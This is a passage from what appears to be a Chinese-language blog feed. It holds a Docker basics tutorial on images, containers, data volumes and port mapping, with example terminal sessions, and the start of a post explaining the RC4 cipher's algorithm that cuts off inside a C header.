<p>在不使用卷的情况下运行一个容器时，任何文件修改都会被记录于容器存储层里。而 Docker 提供的 <code>docker commit</code> 命令可以将容器的存储层保存下来成为镜像，语法格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</div></pre></td></tr></table></figure></p>
<p>用下面的命令将容器保存为镜像：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker commit --author <span class="string">"0x4C43"</span> --message <span class="string">"modify"</span> fd93decf46b8 ubuntu:v2</div><div class="line">sha256:<span class="number">011e54908</span>d10c0f77efdc7ff4fe2c7ec61ba9e0a43d5e862264a914e74c5b0b0</div><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v2                  <span class="number">011e54908</span>d10        <span class="number">12</span> seconds ago      <span class="number">188</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>其中 –author 指定修改的作者，而 –message 记录本次修改的内容。</p>
<p>使用 <code>docker commit</code> 意味着所有对镜像的操作都是黑箱操作，生成的镜像也被称为黑箱镜像。在实际应用中使用 Dockerfile 来定制镜像。</p>
<h4 id="5）删除镜像"><a href="#5）删除镜像" class="headerlink" title="5）删除镜像"></a><strong>5）删除镜像</strong></h4><p>如果要删除本地的镜像，可以使用 <code>docker    rmi</code> 命令。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker rmi dea19</div><div class="line">Untagged: ubuntu:<span class="number">14.04</span></div><div class="line">Untagged: ubuntu@sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Deleted: sha256:dea1945146b96542e6e20642830c78df702d524a113605a906397db1db022703</div><div class="line">Deleted: sha256:<span class="number">6401e3024</span>b4d4ef4c981cde2e830858eb790ee84284e1401cf569a6db8df51d9</div><div class="line">Deleted: sha256:f12ee38eb7aa0ffdd43c657b433d91ac4c2930887c02eb638fd1518f374bc738</div><div class="line">Deleted: sha256:<span class="number">9</span>ac64e2751425199591402799079940629829c7c2fc0e083fb714e5dd94d70a9</div><div class="line">Deleted: sha256:<span class="number">12</span>a6279e654d2f23c2fa086bf2dcd82e1a2c82b01028379bbf2cde061d9235e6</div><div class="line">Deleted: sha256:c47d9b229ca4eaf5d3b85b6fa7f794d00910a42634dd0fd5107a9a937b13b20f</div></pre></td></tr></table></figure></p>
<h3 id="0x03-容器"><a href="#0x03-容器" class="headerlink" title="0x03 容器"></a><strong>0x03 容器</strong></h3><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p>
<h4 id="1）启动容器"><a href="#1）启动容器" class="headerlink" title="1）启动容器"></a><strong>1）启动容器</strong></h4><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。</p>
<p><strong>a. 新建并启动</strong><br>如 0x02 中所示，使用 <code>docker run</code> 启动一个容器。利用这种方式来创建容器时，Docker 在后台运行的标准操作包括：</p>
<blockquote>
<p>检查本地是否存在指定的镜像，不存在就从公有仓库下载<br>利用镜像创建并启动一个容器<br>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层<br>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去<br>从地址池配置一个 ip 地址给容器<br>执行用户指定的应用程序<br>执行完毕后容器被终止    </p>
</blockquote>
<p><strong>b. 启动已终止容器</strong><br>可以利用<code>docker start</code> 命令，直接将一个已经终止的容器启动运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   <span class="number">9</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                       silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">19</span> hours ago        Up <span class="number">19</span> hours                                     ecstatic_morse</div><div class="line">lc@ubuntu:~$ sudo docker start -i <span class="number">5700</span></div><div class="line">Hello World!</div></pre></td></tr></table></figure></p>
<p><strong>c. 守护态运行</strong><br>更多的时候，需要让 Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 -d 参数来实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker image ls</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -d <span class="number">2</span>d696 bash</div><div class="line"><span class="number">931</span>a04d6ac702a478b4c994b7f756eddd4801144be10bc9c760437fd6c9a962f</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div></pre></td></tr></table></figure></p>
<h4 id="2）终止容器"><a href="#2）终止容器" class="headerlink" title="2）终止容器"></a><strong>2）终止容器</strong></h4><p>可以使用 <code>docker stop</code> 来终止一个运行中的容器。</p>
<p>此外，当Docker容器中指定的应用终结时，容器也自动终止。 例如对于只启动了一个终端的容器，用户通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。</p>
<p>终止状态的容器可以用 docker ps -a 命令看到。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">4</span>c95f2701cbd        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">4</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">44</span> seconds ago                       vigilant_beaver</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   About an hour ago   Exited (<span class="number">0</span>) <span class="number">5</span> minutes ago                        silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">20</span> hours ago        Exited (<span class="number">0</span>) <span class="number">8</span> minutes ago                        ecstatic_morse</div></pre></td></tr></table></figure></p>
<h4 id="3）-进入容器"><a href="#3）-进入容器" class="headerlink" title="3） 进入容器"></a><strong>3） 进入容器</strong></h4><p>当需要进入在后台运行的容器时，可以使用<code>docker attach</code>命令进行操作。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker attach <span class="number">931</span>a</div><div class="line">root@<span class="number">931</span>a04d6ac70:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h4 id="4）-导出和导入容器"><a href="#4）-导出和导入容器" class="headerlink" title="4） 导出和导入容器"></a><strong>4） 导出和导入容器</strong></h4><p>使用 <code>docker export</code> 命令可以导出容器快照到本地文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">45</span> minutes ago      Up <span class="number">10</span> seconds                           agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker export <span class="number">931</span>a &gt; ubuntu.tar</div></pre></td></tr></table></figure></p>
<p>使用<code>docker import</code>可以将本地快照文件导入为镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ cat ubuntu.tar | sudo docker <span class="keyword">import</span> - ubuntu:v1                                                                                      </div><div class="line">sha256:<span class="number">22e45</span>fa74eac9efd1f3024044ef2e018495ae67efc67b7600b29f8fec88e57b2</div><div class="line">lc@ubuntu:~$ sudo docker images                                                                                                                   </div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> seconds ago       <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div></pre></td></tr></table></figure></p>
<h4 id="5）删除容器"><a href="#5）删除容器" class="headerlink" title="5）删除容器"></a><strong>5）删除容器</strong></h4><p>使用 <code>docker rm</code> 可以删除处于终止状态的容器。如果要删除一个运行中的容器，可以添加 -f 参数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a                                                                                                                    </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">5</span>bc510e165b4        <span class="number">22e45</span>               <span class="string">"bash"</span>              <span class="number">43</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">32</span> seconds ago                       priceless_jackson</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                        agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm <span class="number">5</span>bc51</div><div class="line"><span class="number">5</span>bc51</div><div class="line">lc@ubuntu:~$ sudo docker ps -a   </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                       agitated_kepler</div></pre></td></tr></table></figure></p>
<h3 id="0x04-数据管理"><a href="#0x04-数据管理" class="headerlink" title="0x04 数据管理"></a><strong>0x04 数据管理</strong></h3><p>在容器中管理数据主要有两种方式：数据卷（Data volumes）和数据卷容器（Data volume containers）。</p>
<h4 id="1）数据卷"><a href="#1）数据卷" class="headerlink" title="1）数据卷"></a><strong>1）数据卷</strong></h4><p>数据卷是一个可供一个或多个容器使用的特殊目录，有以下特性：</p>
<blockquote>
<p>数据卷可以在容器之间共享和重用<br>对数据卷的修改会立马生效<br>对数据卷的更新，不会影响镜像<br>数据卷默认会一直存在，即使容器被删除</p>
</blockquote>
<p><strong>a. 创建数据卷</strong><br>在用 <code>docker run</code> 命令时，使用 -v 选项可创建一个数据卷并挂载到容器里。下面创建一个名为 testVolume 的容器，并加载一个数据卷到容器的 /Volume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --name testVolume -v /Volume <span class="number">2</span>d696 bash</div><div class="line">root@a48cd127e2e9:/<span class="comment"># ls</span></div><div class="line">Volume  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div></pre></td></tr></table></figure></p>
<p>此外，可以指定挂载一个本地主机的目录到容器中去。本地目录的路径必须是绝对路径，如果目录不存在 Docker 会自动为你创建它。下面将本地主机的 localVolume 目录挂载到容器的 /testVolume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> hours ago         <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume <span class="number">2</span>d69 bash</div><div class="line"></div><div class="line">root@f3f239c230b7:/<span class="comment">#</span></div><div class="line">root@f3f239c230b7:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@f3f239c230b7:/<span class="comment"># cat testVolume/test</span></div><div class="line">Hello World!!!</div></pre></td></tr></table></figure></p>
<p>Docker 挂载数据卷的默认权限是读写，用户也可以通过 :ro 指定为只读。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume:ro <span class="number">2</span>d69 bash</div><div class="line">root@d478e93818b6:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@d478e93818b6:/<span class="comment"># ls -l testVolume/</span></div><div class="line">total <span class="number">0</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> <span class="number">1000</span> <span class="number">1000</span> <span class="number">0</span> Oct  <span class="number">4</span> <span class="number">14</span>:<span class="number">55</span> hello</div><div class="line">root@d478e93818b6:/<span class="comment"># rm /testVolume/hello</span></div><div class="line">rm: cannot remove <span class="string">'/testVolume/hello'</span>: Read-only file system</div></pre></td></tr></table></figure></p>
<p><strong>b. 删除数据卷</strong><br> 数据卷是被设计用来持久化数据的，它的生命周期独立于容器，Docker不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷。</p>
<p>在删除容器的时候使用 <code>docker rm -v</code> 命令可以在删除容器的同时移除数据卷。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">/var/lib/docker/aufs/diff/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line">/var/lib/docker/aufs/mnt/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                         PORTS               NAMES</div><div class="line">a48cd127e2e9        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                          testVolume</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">6</span> hours ago         Exited (<span class="number">0</span>) About an hour ago                       agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm -v a48cd</div><div class="line">a48cd</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">lc@ubuntu:~$</div></pre></td></tr></table></figure>
<p><strong>c. 查看数据卷信息</strong><br>使用<code>docker inspect</code> 命令可以查看容器的详细信息，找到其中有关数据卷的项：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">"Mounts"</span>: [</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Type"</span>: <span class="string">"bind"</span>,</div><div class="line">        <span class="string">"Source"</span>: <span class="string">"/home/lc/localVolume"</span>,</div><div class="line">        <span class="string">"Destination"</span>: <span class="string">"/testVolume"</span>,</div><div class="line">        <span class="string">"Mode"</span>: <span class="string">"ro"</span>,</div><div class="line">        <span class="string">"RW"</span>: false,</div><div class="line">        <span class="string">"Propagation"</span>: <span class="string">"rprivate"</span></div><div class="line">    &#125;</div><div class="line">],</div></pre></td></tr></table></figure></p>
<h4 id="2）数据卷容器"><a href="#2）数据卷容器" class="headerlink" title="2）数据卷容器"></a><strong>2）数据卷容器</strong></h4><p>如果一些持续更新的数据需要在容器之间共享，可以创建数据卷容器。数据卷容器是一个正常的容器，提供数据卷供其它容器挂载。</p>
<p>首先，创建一个名为 dbdata 的数据卷容器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -v /dbdata --name dbdata <span class="number">2</span>d696 echo Data-only container <span class="keyword">for</span> <span class="number">2</span>d696                                                  </div><div class="line">Data-only container <span class="keyword">for</span> <span class="number">2</span>d696</div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line">ce22bb5c5b4d        <span class="number">2</span>d696               <span class="string">"echo Data-only co..."</span>   <span class="number">12</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">10</span> seconds ago                       dbdata</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">7</span> hours ago         Exited (<span class="number">0</span>) <span class="number">2</span> hours ago                          agitated_kepler</div></pre></td></tr></table></figure></p>
<p>然后，在其他容器中使用 –volumes-from 来挂载 dbdata 容器中的数据卷。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db1 <span class="number">2</span>d696 bash                                                                      </div><div class="line">root@<span class="number">1</span>a40cd12ae27:/<span class="comment"># cd dbdata/       </span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment">#</span></div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db2 <span class="number">2</span>d696 bash</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># ls</span></div><div class="line">bin  boot  dbdata  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># cd dbdata/</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># mkdir testvolume</span></div><div class="line"></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">testvolume</div></pre></td></tr></table></figure></p>
<h3 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a><strong>0x05 网络配置</strong></h3><p>通过 -P 或 -p 参数进行端口映射可以在外部访问容器中的网络应用。当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</p>
<p>-p 则可以指定要映射的端口，在一个指定端口上只可以绑定一个容器。</p>
<h4 id="1）端口映射"><a href="#1）端口映射" class="headerlink" title="1）端口映射"></a><strong>1）端口映射</strong></h4><p>使用 <code>hostPort:containerPort</code> 将本地的 6666 端口映射到容器的 6666 端口。此时默认会绑定本地所有接口上的所有地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -d  -p 6666:6666 2d696 bash</div><div class="line">d6112543fa80c1c939f3ef0653efb7c5c29a5ccccc4dcae8fc81c764e743d1ff</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</div><div class="line">d6112543fa80        2d696               "bash"              4 seconds ago       Up 3 seconds        0.0.0.0:6666-&gt;6666/tcp   objective_lumiere</div></pre></td></tr></table></figure></p>
<h4 id="2）查看映射端口"><a href="#2）查看映射端口" class="headerlink" title="2）查看映射端口"></a><strong>2）查看映射端口</strong></h4><p>使用 <code>docker port</code> 可查看当前映射的端口配置，也可以查看绑定的地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker port d611</div><div class="line">6666/tcp -&gt; 0.0.0.0:6666</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="external">Docker — 从入门到实践</a><br>[2] <a href="https://blog.kinpzz.com/2017/05/16/docker-ci-cd/" target="_blank" rel="external">Docker 入门 &amp; CI/CD实践</a>       </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RC4 算法实现]]></title>
      <url>/RC4%20%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p>RC4 是一种对称秘钥流加密算法，对称加密算法使用的加密和解密秘钥是相同的，或是从其中一个能很容易推导出另一个。RC4 算法的特点是算法简单，运行速度快，而且密钥长度是可变的，密钥长度范围为 1-256 字节。</p>
<h3 id="0x01-算法原理"><a href="#0x01-算法原理" class="headerlink" title="0x01 算法原理"></a><strong>0x01 算法原理</strong></h3><p>算法主要包括两个部分：1）使用 key-scheduling algorithm (KSA) 算法根据用户输入的秘钥 key 生成 S 盒；2）使用 Pseudo-random generation algorithm (PRGA) 算法生成秘钥流用于加密数据。</p>
<h4 id="1）初始化-S-盒"><a href="#1）初始化-S-盒" class="headerlink" title="1）初始化 S 盒"></a><strong>1）初始化 S 盒</strong></h4><p>KSA算法初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥打乱 S 盒。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    S[i] := i</div><div class="line">endfor</div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    j := (j + S[i] + key[i mod keylength]) mod <span class="number">256</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]</div><div class="line">endfor</div></pre></td></tr></table></figure></p>
<h4 id="2-加密"><a href="#2-加密" class="headerlink" title="2) 加密"></a><strong>2) 加密</strong></h4><p>Pseudo-random generation algorithm (PRGA) 算法根据 S 盒生成与明文长度相同的秘钥流，使用秘钥流加密明文。秘钥流的生成如下图所示：<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/RC4.svg/800px-RC4.svg.png" alt=""><br>循环体中每收到一个字节，a 和 b 定位S盒中的一个元素，并与输入字节异或，得到密文 k；同时，c 还改变了 S 盒。由于异或运算的特性，使得加密与解密过程一致。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">i := <span class="number">0</span></div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">while</span> GeneratingOutput:</div><div class="line">    i := (i + <span class="number">1</span>) mod <span class="number">256</span>  <span class="comment">// a</span></div><div class="line">    j := (j + S[i]) mod <span class="number">256</span> <span class="comment">// b</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]  <span class="comment">// c</span></div><div class="line">    K := inputByte ^ S[(S[i] + S[j]) mod <span class="number">256</span>] <span class="comment">// d</span></div><div class="line">    output K</div><div class="line">endwhile</div></pre></td></tr></table></figure></p>
<h3 id="0x02-算法实现"><a href="#0x02-算法实现" class="headerlink" title="0x02 算法实现"></a><strong>0x02 算法实现</strong></h3><p><a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/crypto/rc4/rc4.c" target="_blank" rel="external">开源项目</a>中的算法实现（稍作修改）如下。</p>
<h4 id="1）开源实现"><a href="#1）开源实现" class="headerlink" title="1）开源实现"></a><strong>1）开源实现</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// RC4.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> 